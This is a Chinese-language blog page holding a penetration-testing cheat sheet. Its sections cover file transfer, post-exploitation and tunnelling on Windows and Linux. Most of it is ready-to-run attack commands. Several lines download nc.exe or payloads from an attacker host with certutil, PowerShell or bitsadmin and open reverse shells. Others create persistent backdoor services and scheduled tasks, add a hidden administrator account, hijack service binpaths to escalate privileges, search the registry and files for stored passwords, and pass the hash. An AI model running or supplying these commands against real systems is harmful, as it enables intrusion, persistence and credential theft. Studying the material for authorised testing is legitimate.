title="检查是否已启用Powershell日志记录"></a>检查是否已启用Powershell日志记录</h3><pre><code class="shell">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLoggingreg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</code></pre><h3 id="检查WinEvent日志中是否有SecureString"><a href="#检查WinEvent日志中是否有SecureString" class="headerlink" title="检查WinEvent日志中是否有SecureString"></a>检查WinEvent日志中是否有SecureString</h3><pre><code class="powershell">Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Microsoft-Windows-PowerShell/Operational&#39;; ID=4104&#125; | Select-Object -Property Message | Select-String -Pattern &#39;SecureString&#39;</code></pre><h3 id="检查WinEvent的机器唤醒-睡眠时间"><a href="#检查WinEvent的机器唤醒-睡眠时间" class="headerlink" title="检查WinEvent的机器唤醒&#x2F;睡眠时间"></a>检查WinEvent的机器唤醒&#x2F;睡眠时间</h3><pre><code class="pwoershell">Get-WinEvent -FilterHashTable @&#123; ProviderName = &#39;Microsoft-Windows-Power-TroubleShooter&#39;  ; Id = 1 &#125;|Select-Object -Property @&#123;n=&#39;Sleep&#39;;e=&#123;$_.Properties[0].Value&#125;&#125;,@&#123;n=&#39;Wake&#39;;e=&#123;$_.Properties[1].Value&#125;&#125;</code></pre><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><pre><code class="shell">#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftpservice atftpd start# Windowstftp -i $ATTACKER get /download/location/file /save/location/file</code></pre><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><pre><code class="shell"># Linux: set up ftp server with anonymous logon access;twistd -n ftp -p 21 -r /file/to/serve# Windows shell: read FTP commands from ftp-commands.txt non-interactively;echo open $ATTACKER&gt;ftp-commands.txtecho anonymous&gt;&gt;ftp-commands.txtecho whatever&gt;&gt;ftp-commands.txtecho binary&gt;&gt;ftp-commands.txtecho get file.exe&gt;&gt;ftp-commands.txtecho bye&gt;&gt;ftp-commands.txt ftp -s:ftp-commands.txt# Or just a one-liner(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd</code></pre><h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><pre><code class="shell">certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe</code></pre><h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http://10.11.0.245/nc.exe&#39;, &#39;C:\\Temp\\nc.exe&#39;)&quot;</code></pre><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><pre><code class="shell">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/file.exe&#39;,&#39;file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;file.exe&#39;);# download using default proxy credentials and launchpowershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;</code></pre><h3 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h3><pre><code class="shell">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code class="shell">wget http://$ATTACKER/filecurl http://$ATTACKER/file -Oscp ~/file/file.bin user@$TARGET:tmp/backdoor.py</code></pre><h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><pre><code class="shell"># Attackernc -l -p 4444 &lt; /tool/file.exe# Victimnc $ATTACKER 4444 &gt; file.exe</code></pre><h3 id="Windows-“debug-exe”-Method"><a href="#Windows-“debug-exe”-Method" class="headerlink" title="Windows “debug.exe” Method"></a>Windows “debug.exe” Method</h3><pre><code class="shell"># 1. In Linux, convert binary to hex ascii:wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt# 2. Paste nc.txt into Windows Shell.</code></pre><h3 id="Windows-BitsAdmin"><a href="#Windows-BitsAdmin" class="headerlink" title="Windows BitsAdmin"></a>Windows BitsAdmin</h3><pre><code class="shell">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe</code></pre><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="利用服务进行持久化"><a href="#利用服务进行持久化" class="headerlink" title="利用服务进行持久化"></a>利用服务进行持久化</h3><pre><code class="shell"># cmdsc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;# powersehllNew-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName &quot;&#39;C:\Program Files\NotEvil\back.exe&#39;&quot; -Description &quot;Not at all&quot;</code></pre><h3 id="创建持久化后门"><a href="#创建持久化后门" class="headerlink" title="创建持久化后门"></a>创建持久化后门</h3><pre><code class="shell"># Launch evil.exe every 10 minutesschtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe</code></pre><h3 id="创建用户并添加到本地管理员组"><a href="#创建用户并添加到本地管理员组" class="headerlink" title="创建用户并添加到本地管理员组"></a>创建用户并添加到本地管理员组</h3><pre><code class="shell">net user spotless spotless /add &amp; net localgroup Administrators spotless /add</code></pre><h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><pre><code class="shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /t REG_DWORD /v spotless /d 0 /f</code></pre><h3 id="利用服务配置错误进行提权"><a href="#利用服务配置错误进行提权" class="headerlink" title="利用服务配置错误进行提权"></a>利用服务配置错误进行提权</h3><pre><code class="shell"># Look for SERVICE_ALL_ACCESS in the outputaccesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;sc qc [service_name] (to verify!)sc start [service_name]</code></pre><h3 id="递归查找隐藏文件"><a href="#递归查找隐藏文件" class="headerlink" title="递归查找隐藏文件"></a>递归查找隐藏文件</h3><pre><code class="shell">dir /A:H /s &quot;c:\program files&quot;</code></pre><h3 id="检查文件-目录权限"><a href="#检查文件-目录权限" class="headerlink" title="检查文件&#x2F;目录权限"></a>检查文件&#x2F;目录权限</h3><pre><code class="shell">icacls.exe C:\folder /findsid userName-or-*sid /t//look for (F)ull, (M)odify, (W)rite</code></pre><h3 id="检查Windows存储的凭据"><a href="#检查Windows存储的凭据" class="headerlink" title="检查Windows存储的凭据"></a>检查Windows存储的凭据</h3><pre><code class="shell">c:\unattend.xmlc:\sysprep.infc:\sysprep\sysprep.xmldir c:\*vnc.ini /s /bdir c:\*ultravnc.ini /s /b dir c:\ /s /b | findstr /si *vnc.inifindstr /si password *.txt | *.xml | *.inifindstr /si pass *.txt | *.xml | *.inidir /s *cred* == *pass* == *.conf# Windows Autologonreg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;# VNCreg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;# Puttyreg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;# Registryreg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s</code></pre><h3 id="检查未注册（引用）的服务"><a href="#检查未注册（引用）的服务" class="headerlink" title="检查未注册（引用）的服务"></a>检查未注册（引用）的服务</h3><pre><code class="shell">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></pre><h3 id="开启进程"><a href="#开启进程" class="headerlink" title="开启进程"></a>开启进程</h3><h4 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code class="shell"># Requires PSRemoting$username = &#39;Administrator&#39;;$password = &#39;1234test&#39;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command &#123; whoami &#125;# without PSRemotingcmd&gt; powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;, (ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))# without PS Remoting, with argumentscmd&gt; powershell -command &quot;start-process cmd.exe -argumentlist &#39;/c calc&#39; -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;,(ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))&quot;</code></pre><h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><pre><code class="shell"># Requires interactive consolerunas /user:userName cmd.exe</code></pre><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><pre><code class="shell">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe</code></pre><h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><pre><code class="shell">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe</code></pre><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h3><pre><code class="shell"># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER# Scenario: access a host that&#39;s being blocked by a firewall via SSH_SERVER;ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER</code></pre><h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><pre><code class="shell"># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;ssh -D 127.0.0.1:8080 user@SSH_SERVER</code></pre><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><pre><code class="shell"># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389# Scenario: expose RDP on non-routable network;ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVERplink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP</code></pre><h3 id="Proxy-Tunnel"><a href="#Proxy-Tunnel" class="headerlink" title="Proxy Tunnel"></a>Proxy Tunnel</h3><pre><code class="shell"># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128# Scenario: a remote host has SSH running, but it&#39;s only bound to 127.0.0.1, but you want to reach it;proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555ssh user@127.0.0.1 -p 5555</code></pre><h3 id="HTTP隧道-SSH-Over-HTTP"><a href="#HTTP隧道-SSH-Over-HTTP" class="headerlink" title="HTTP隧道: SSH Over HTTP"></a>HTTP隧道: SSH Over HTTP</h3><pre><code class="shell"># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22hts -F localhost:22 80# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80htc -F 8080 192.168.1.15:80# Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22ssh localhost -p 8080</code></pre><h3 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h3><pre><code class="shell">#添加一个IPV4到IPV4的端口映射netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.75.130  connectport=8080#指定监听ip和端口可以删除netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4445#查看存在的转发netsh interface portproxy show all</code></pre><blockquote><p>参考链接：<a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">Pentesting Cheatsheets</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CheckList </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
